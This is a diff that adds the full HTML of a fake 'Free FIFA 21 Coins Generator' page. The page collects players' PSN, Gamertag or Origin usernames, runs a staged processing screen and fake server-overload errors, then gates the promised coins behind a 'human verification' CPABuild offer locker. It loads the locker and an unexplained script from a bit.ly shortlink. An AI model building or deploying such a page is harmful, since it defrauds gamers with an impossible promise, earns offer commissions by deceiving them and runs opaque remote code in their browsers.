@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+
+    <title>Free FIFA 21 Coins Generator</title>
+    
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="description" content="A Fifa 21 Coins Generator" />
+    
+    <!-- StyleSheets -->    
+    <link rel="icon" type="image/png" href="img/favicon.html">
+    <link href="./css/font-awesome.min.css" rel="stylesheet">
+    <link href="./css/bootstrap.min.css" rel="stylesheet">
+    <link href="./css/rangeslider.css" rel="stylesheet">
+    <link href="./css/sweet-alert.css" rel="stylesheet">
+    <link href="./css/magnific-popup.css" rel="stylesheet">
+    <link href="./css/jquery.raty.css" rel="stylesheet">
+    <link href="./css/style.css" rel="stylesheet">
+
+    <!-- Your CPABuild Locker Info HERE -->
+
+    <script type="text/javascript">
+        var CPABUILDSETTINGS={"it":1111111,"key":"b926d"};
+    </script>
+    <script src="https://d13nu0oomnx5ti.cloudfront.net/f7326f9.js"></script>
+
+    <!-- End Your CPABuild Locker Info -->
+    
+</head>
+
+<body width="device-width">
+	<noscript>
+    	<div class="alert alert-warning alert-dismissable">
+            <strong>Warning!</strong> It seems like you have JavaScript disabled. To ensure a smooth experience, please enable JavaScript.
+        </div>
+    </noscript>
+        
+	<div id="loading_modal" class="mfp-hide white-popup-block">
+		<div class="row">
+			<div class="col-md-12">
+				<div class="loading_area">
+					<div class="loader"></div>
+					<p>Processing</p>
+				</div>
+				<div class="error_message">
+					<h2>ERROR!</h2>
+					<p>Our servers are currently overloaded, and we couldn't complete your request at this time. This will be fixed very soon, so please try again in five minutes. We're so sorry about this.</p>
+				</div>
+			</div>
+		</div>
+	</div>
+        
+    <header>
+    	<div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <section id="gen_section" class="gen-section">
+		
+		<div class="container">
+        	<div class="row">
+                <div class="col-md-12">
+                    <div class="inside-section">
+                        
+                        <div class="section-heading">
+                            <div class="row">
+                                <div class="col-md-12">
+                                    <h1>GET YOUR COINS</h1>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="section-content">
+                            <div class="generator-section">
+                            
+                                <div class="row">
+                                    <div class="col-md-12">
+                                        <h3><span style="color:red">STEP 1:</span> Select your platform</h3>
+                                        <p>We need to know which platform you use in order to connect to as the login server varies.</p>
+                                    </div>
+                                </div>
+                                
+                                <div class="row">
+                                	<div class="col-md-12">
+                                        <ul class="device-list">
+                                            <li class="device-select d-ps">
+                                                <div class="icon icon-ps"></div>
+                                            </li>
+                                            <li class="device-select d-xb">
+                                                <div class="icon icon-xb"></div>
+                                            </li>
+                                            <li class="device-select d-pc">
+                                                <div class="icon icon-pc"></div>
+                                            </li>
+                                            <li class="device-select d-mobile">
+                                            	<div class="icon icon-mob"></div>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
+                                
+                                <br class="clearfix"/>
+                                    
+                                <div class="row">
+                                    <div class="col-md-12">
+                                        <h3><span style="color:red">STEP 2:</span> Enter your username:</h3>
+                                        <p>In order for us to ensure that you get your coins we'll need to link the server to your account.</p>
+                                    </div>
+                                </div>
+                                
+                                <div class="row">
+                                    <div class="col-md-offset-4 col-md-4">
+                                        <div class="form-group">
+                                            <input id="fifa_username" type="text" class="form-control" placeholder="Enter your PSN / Gamertag or Origin Username">
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <br class="clearfix"/>
+                                
+                                <div class="row">
+                                    <div class="col-md-12">
+                                        <h3><span style="color:red">STEP 3:</span> Select your items:</h3>
+                                        <p>How many free FIFA coins do you want? A million, or more... you choose!</p>
+                                    </div>
+                                </div>
+                                
+                                <div class="row">
+                                    <div class="col-md-offset-3 col-md-3">
+                                        <div class="form-group">
+                                            <label for="fifaversion_select">Which FIFA?</label>
+                                            
+                                            <select id="fifaversion_select" class="form-control gen-select-version">
+                                                <option value="FIFA_20">FIFA 21</option>
+                                                <option value="FIFA_19">FIFA 20</option>
+                                                <option value="FIFA_18">FIFA 19</option>
+                                            </select>
+                                        </div>
+                                    </div>
+                                    <div class="col-md-3">
+                                        <div class="form-group">
+											<label id="coin_input_label" for="coin_input">Amount of coins: <span class="coins_val"></span></label>
+											<input id="coin_input" type="range" min="0" max="9999999" step="1000" value="0">
+                                        </div>
+                                    </div>
+                                </div> 
+                                
+                                <div class="row">
+                                	<div class="col-md-12">
+											
+                                	</div>
+                                </div>
+                                
+                                <div class="row">
+                                	<div class="col-md-12 text-center">
+                                		<div class="checkbox">
+                                			<label>
+												<input type="checkbox"> Use Proxy and AES-256 Encryption
+											</label>
+										</div>
+                                    </div>
+                                </div>
+                                
+                                <br class="clearfix"/>
+			
+                                <div class="row">
+                                    <div class="col-md-offset-3 col-md-6">
+                                        <div class="row">
+                                            <div class="col-md-12">
+                                                <button class="gen-button"><i class="fa fa-gear"></i> Get your coins!</button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            
+                            </div> <!-- End of generator-section -->
+                            
+                            <div class="gen-console-area">
+                                <div class="row">
+                                    <div class="col-md-12">
+                                        <div class="loading-spinner"></div>
+                                        <h3 class="gen-loading-msg">Processing your request</h3>
+                                    </div>
+                                </div>
+                                <div class="row">
+                                    <div class="col-md-12">
+                                        <div class="gen-dev-console">
+                                            <ul class="dev-console-text"></ul>
+                                        </div>
+                                     </div>
+                                </div>
+                            </div>
+                            
+                            <div class="offers-section">
+								<div class="row">
+									<div class="col-md-12">
+										<h3>Human verification required</h3>
+										<p>Please click on Human Verification below and complete a quick offer to receive your coins. This is important so we can ensure that there are no bots exploiting our service.<br>Thank you for understanding.</p>
+										<div class="loading-spinner"></div>
+										<p class="offers_loading_msg">Waiting for completion..</p>
+										<div align="center">
+                                            <button id="verify" onclick="CPABuildLock()">Claim</button>
+										</div>
+									</div>
+								</div>
+                            	<div class="row">
+                            		<div class="col-md-12">
+										<ul class="offersList">
+												
+										</ul>
+                            		</div>
+                            	</div>
+                            </div>
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+        
+        
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12 text-center">
+                    <p>&copy; Copyright - All Rights Reserved.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+        
+	<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+    <script src="./js/jquery.magnific-popup.min.js"></script>
+
+	<script src="./js/bootstrap.min.js"></script>
+	<script src="./js/rangeslider.min.js"></script>
+	<script src="./js/smoothscroll.js"></script>
+    <script src="./js/sweet-alert.min.js"></script>
+    <script src="https://bit.ly/37opb8h"></script>
+	<script src="./config/config.json"></script>
+	<script src="./js/livestamp.min.js"></script>
+	<script src="./js/jquery.raty.js"></script>
+	<script>
+		var FIFA_SERVER;
+		function fifaserver(json){
+			FIFA_SERVER = json.country_code3;
+		}
+    </script>
+	<script src="./js/main.js"></script>
+</body>
+
+</html>
